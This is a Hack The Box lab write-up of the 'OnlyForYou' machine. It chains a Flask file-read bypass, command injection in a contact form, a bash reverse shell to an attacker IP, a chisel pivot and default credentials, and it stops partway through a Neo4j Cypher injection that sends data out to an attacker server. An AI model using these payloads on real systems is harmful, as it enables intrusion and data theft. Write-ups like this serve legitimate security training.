## HTB OnlyForYou (Medium) - Writeup

Difficulty: Medium

OnlyForYou is a chained exploitation challenge involving Python and Neo4J.  
Starting with a web app misconfiguration, I uncover code execution through weak input validation.  
From there, I gain a foothold, pivot via a database injection, and finish with privilege escalation using an insecure pip-based sudo setup.  

---

## Nmap 

#### The nmap scan revealed two open ports:

![obraz](https://github.com/user-attachments/assets/92204206-374e-46f8-90af-ad4da8636753)


## Port 80 - Website  

I'll start by adding only4you.htb to /etc/hosts.  

![obraz](https://github.com/user-attachments/assets/4826c751-3764-4709-b8b8-388fc6042952)


From quick enumeration I found only a contact form.  
It may be valuable later now we're going to move on.  

I've also tried directory busting but without a success.  
If not directory busting maybe subdomain busting will find something useful.  
```
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://only4you.htb -H "Host: FUZZ.only4you.htb"  --hw 12
```
First I run it without the last flag, everything returned 12 W, meaning we had to add --hw 12.  

![obraz](https://github.com/user-attachments/assets/211f6bc5-6df1-4675-a55d-cbe097ceacb0)  

We've found one subdomain:  beta.only4you.htb  
Add it to /etc/hosts, and check this website.  

![obraz](https://github.com/user-attachments/assets/5a93cbca-3773-4686-9b27-9592f8d68f50)

It offers source.zip to download.  
Let's get it and unzip:  

![obraz](https://github.com/user-attachments/assets/108bd0a6-1ed1-405c-beed-19b90d35c924)



## Source Code - Analysis  

Let's open app.py  
First thing that catches my eye is that we're dealing with Flask application.  

![obraz](https://github.com/user-attachments/assets/fc7dda02-c35d-4904-9652-e4576af32b5a)

I read the code, the thing that seems promising is /download, as it may load a file from the disk.  
I'll copy the whole code here for your conveinence:  
```
from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024
app.config['RESIZE_FOLDER'] = 'uploads/resize'
app.config['CONVERT_FOLDER'] = 'uploads/convert'
app.config['LIST_FOLDER'] = 'uploads/list'
app.config['UPLOAD_EXTENSIONS'] = ['.jpg', '.png']

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')

@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")

@app.route('/convert', methods=['POST', 'GET'])
def convert():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only jpg and png images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['CONVERT_FOLDER'], img))
            if ext == '.png':
                image = convertpj(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
            else:
                image = convertjp(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url) 
        return render_template('convert.html')
    else:
        [f.unlink() for f in Path(app.config['CONVERT_FOLDER']).glob("*") if f.is_file()]
        return render_template('convert.html')

@app.route('/source')
def send_report():
    return send_from_directory('static', 'source.zip', as_attachment=True)

@app.route('/list', methods=['GET'])
def list():
    return render_template('list.html')

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

I will also copy tool.py:  

```
from flask import send_file, current_app
import os
from PIL import Image
from pathlib import Path

def convertjp(image):
    imgpath = os.path.join(current_app.config['CONVERT_FOLDER'], image)
    img = Image.open(imgpath)
    rgb_img = img.convert('RGB')
    file = os.path.splitext(image)[0] + '.png'
    rgb_img.save(current_app.config['CONVERT_FOLDER'] + '/' + file)
    return file

def convertpj(image):
    imgpath = os.path.join(current_app.config['CONVERT_FOLDER'], image)
    img = Image.open(imgpath)
    rgb_img = img.convert('RGB')
    file = os.path.splitext(image)[0] + '.jpg'
    rgb_img.save(current_app.config['CONVERT_FOLDER'] + '/' + file)
    return file

def resizeimg(image):
    imgpath = os.path.join(current_app.config['RESIZE_FOLDER'], image)
    sizes = [(100, 100), (200, 200), (300, 300), (400, 400), (500, 500), (600, 600), (700, 700)][::-1]
    img = Image.open(imgpath)
    sizeimg = img.size
    imgsize = []
    imgsize.append(sizeimg)
    for x,y in sizes:
        for a,b in imgsize:
            if a < x or b < y:
                [f.unlink() for f in Path(current_app.config['LIST_FOLDER']).glob("*") if f.is_file()]
                [f.unlink() for f in Path(current_app.config['RESIZE_FOLDER']).glob("*") if f.is_file()]
                return False
            else:
                img.thumbnail((x, y))
                if os.path.splitext(image)[1] == '.png':
                    pngfile = str(x) + 'x' + str(y) + '.png'
                    img.save(current_app.config['LIST_FOLDER'] + '/' + pngfile)
                else:
                    jpgfile = str(x) + 'x' + str(y) + '.jpg'
                    img.save(current_app.config['LIST_FOLDER'] + '/' + jpgfile)
    return True
```



## Exploitation based on source code  

Let's open burpsuite, turn intercept on, run foxyproxy and catch a request to /download.  

![obraz](https://github.com/user-attachments/assets/723a7b6d-ad64-43c7-af0a-01d84e965a0e)  

We will send it to repeater in burp with ctrl+r, and change request method.   

![obraz](https://github.com/user-attachments/assets/564ed7d1-4bc5-48a0-a6f8-fb12b3cd73c7)

There is a part in code that reveals the parameter that we will add called "image":  

![obraz](https://github.com/user-attachments/assets/a7923fd5-348a-4af7-a9c6-1579d394f3ee)

Also if our filename contains .. or starts with ../ it will detect hacking and redirect us to /list.  
Meaning typical Local File Inclusion won't work here.  
But if we look at the code once again we notice os.path.join function is used.  
If we use absolute path with this function it will ignore previous arguments, here resulting in LFI:  

![obraz](https://github.com/user-attachments/assets/d280c173-5bbf-4bfa-8097-c0a973732a63)

From the output of /etc/passwd we found user 'john' and user 'dev'.   
We can try something basic like looking for ssh keys:  
```
image=/home/john/.ssh/id_rsa
and
image=/home/dev/.ssh/id_rsa
```

unfortunetly we don't succeed.   



## Enumerating config files using LFI  

We know that target system runs nginx from previous nmap.  
We'll start with:  
```
image=/etc/nginx.conf
```
But we don't have anything intresting there.  
Second file I tried was:  
```
image=/etc/nginx/sites-enabled/default.conf
```
It also didn't work but sometimes it doesn't end with .conf:  
```
image=/etc/nginx/sites-enabled/default
```

Finally it worked, here's the output:  

![obraz](https://github.com/user-attachments/assets/e4bc2c3e-f58e-401d-ac70-e1d9d2418668)

It exposed web root directory name --> **/var/www/only4you.htb**  

We can assume that main site is also written in flask meaning it is likely called app.py:  

![obraz](https://github.com/user-attachments/assets/eb05d7d8-4937-4564-a395-2d42b859cac0)



## Source Code - Analysis 2

I'll copy only a snippet of the code here:   
```
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
```

It imports sendmessage from form module.  
And also it passes user data to sendmessage function as seen below:  
```
status = sendmessage(email, subject, message, ip)
```

It means that there is likely a form.py file in the same directory.  
We can try to read it with LFI:  

```
import re
import smtplib
from email.message import EmailMessage
from subprocess import run, PIPE

def sendmessage(email, subject, message, ip):
    status = issecure(email, ip)
    
    if status == 2:
        msg = EmailMessage()
        msg['From'] = email
        msg['To'] = 'info@only4you.htb'
        msg['Subject'] = subject
        msg.set_content(message)
        
        smtp = smtplib.SMTP(host='localhost', port=25)
        smtp.send_message(msg)
        smtp.quit()
        return status

    elif status == 1:
        return status
    else:
        return status

def issecure(email, ip):
    if not re.match(r"([A-Za-z0-9]+[.\-_])*[A-Za-z0-9]+@[A-Za-z0-9\-]+(\.[A-Za-z]{2,})", email):
        return 0
    else:
        domain = email.split("@", 1)[1]
        result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
        output = result.stdout.decode('utf-8')

        if "v=spf1" not in output:
            return 1
        else:
            <...SNIP...>
```

This file has two functions:  sendmessage(), and issecure()  
issecure checks if email specified is a valid email using regex pattern.  
it then uses subprocess.run to check the domain.  
What's intresting is that it runs os command dig:    
```
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```


## Exploiting command injection  

It runs os command, without proper sanitization meaning we can inject commands there most likely.  
Let's catch a request with burp sending contact form, and send it to repeater with ctrl+r.  

![obraz](https://github.com/user-attachments/assets/5871fabf-d586-4b39-8693-23cea4d1408b)

Now we can run tcpdump to watch for incoming pings in the background:  

![obraz](https://github.com/user-attachments/assets/ed97cb61-c2b5-4604-bf02-1cd4a2fe59d3)

Now we can inject commands into email parameter:  

![obraz](https://github.com/user-attachments/assets/12738363-27fb-4416-bfcf-22b10388c193)

Before sending it you need to select your whole command and press ctrl+u to URL encode it.  
Now we should get pings from the target machine which means we have Remote Code Execution.  

![obraz](https://github.com/user-attachments/assets/429964e8-6a43-4a22-8c20-a53441339c11)

All we need to do now is to find proper payload that will give us connection back.  
Payload I'll use is very simple but it works.  
```
bash -c 'bash -i >& /dev/tcp/10.10.14.10/9005 0>&1'
```
![obraz](https://github.com/user-attachments/assets/b9e6c864-750d-43aa-8b59-d8a7ce530522)

In the screenshot it's already encoded.  

We have successfully gained a shell access:  

![obraz](https://github.com/user-attachments/assets/cd72d9c4-0a48-41ba-9668-c24ec15f1829)



## Priv esc to john

I tried to access two of the home folders but as www-data we can't do that.  
There are some files in /opt that might be intresting but we can't access them either.  
But without deep enumeration I end up finding intresting port open:  
```
netstat -nvlp
```
![obraz](https://github.com/user-attachments/assets/bfc3cc9a-dc9e-425f-bda2-edd62ab631a4)

Port 8001 seems intresting.  We can ofc try to curl it first:  
```
curl http://127.0.0.1:8001
```
![obraz](https://github.com/user-attachments/assets/b0fac5e6-7bd7-4a60-9128-4243d111cd48)

Unfortunately it only shows a redirect page, we need to forward this port to see it.  
It can be achieved with a tool called "chisel".   
We will use reverse server on kali linux to listen for connections.  
And connect from the target machine using SOCKS5 proxy to forward all ports at once.  

Chisel binary can be downloaded here:  
```
https://github.com/jpillora/chisel/releases
```

Now on kali we need to run reverse server on port 2222 or any other port:  
```
chisel server -p 2222 -reverse
```

![obraz](https://github.com/user-attachments/assets/2b5dacef-090a-4a95-8405-882332147351)


Move chisel binary to the target machine with python server and wget:  
And give it execute permission with chmod +x.  

![obraz](https://github.com/user-attachments/assets/ad33066b-2474-4223-b3d3-39352810d130)

Now we can run a connection to our kali IP:  
```
./chisel client 10.10.14.10:2222 R:1080:socks
```
![obraz](https://github.com/user-attachments/assets/fbd82610-9338-424c-a3a7-751bbad40430)

Last thing we need to configure is FoxyProxy for proxychains.  
Proxychains is a tool that is by default on kali so you shouldn't worry by that.  

I'll add a new proxy in FoxyProxy settings and configure it like that:  

![obraz](https://github.com/user-attachments/assets/131b9c7d-5028-4efd-8e72-f140f740d48a)

Now use it as current proxy:  

![obraz](https://github.com/user-attachments/assets/cd79915c-db4c-492d-b2d1-4e7a9a5c6167)

Now we should be able to access port 8001 in our browser on kali by going to:   
```
http://localhost:8001
```

It gives us login page as show below:  

![obraz](https://github.com/user-attachments/assets/85d64ec0-a8f8-438c-b213-165ebfe40a99)

When we see a login page (especially when it runs on localhost only) we should always try some default credentials.  
In this case admin:admin worked.  

![obraz](https://github.com/user-attachments/assets/f1ad9c86-ff20-4337-be61-d00b11f7beb9)

There is a hint saying:  
"Migrated to a new database(neo4j)"   

It can be validated by looking at previously shown ports, port 7474 is used for neo4j database.  
First thing that came to my mind is that it could be a hint for neo4j Cypher injection.  


## Neo4j - Cypher Injection

Let’s start with a brief introduction.  
Cypher is the query language used by Neo4j, a popular graph database.  
It’s similar in purpose to SQL but is specifically designed for querying and manipulating graph data structures rather than traditional relational tables.  

You’ve probably heard of SQL injection, a common attack where malicious users inject SQL code into queries to manipulate or access unauthorized data. Similarly, Cypher injection occurs when an attacker injects malicious Cypher code into a query, exploiting vulnerabilities in how the query is constructed or parameterized.   

We can verify if it's vulnerable by simply using query that will return everything.  
![obraz](https://github.com/user-attachments/assets/85e1a763-3bc8-4637-8ed8-76c04fbf627f)

It returned all records meaning we have a proof of concept.  

Let's now start with dumping the database, first we will list labels using this payload:  
```
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.9/?'+label AS b RETURN b//
```
Before running it we need to start python server:  
```
python3 -m http.server 80
```
LOAD CSV will send output to our server as shown below:  

![obraz](https://github.com/user-attachments/assets/2e29c9e5-5cfe-492b-8d55-15469bed4d3c)















































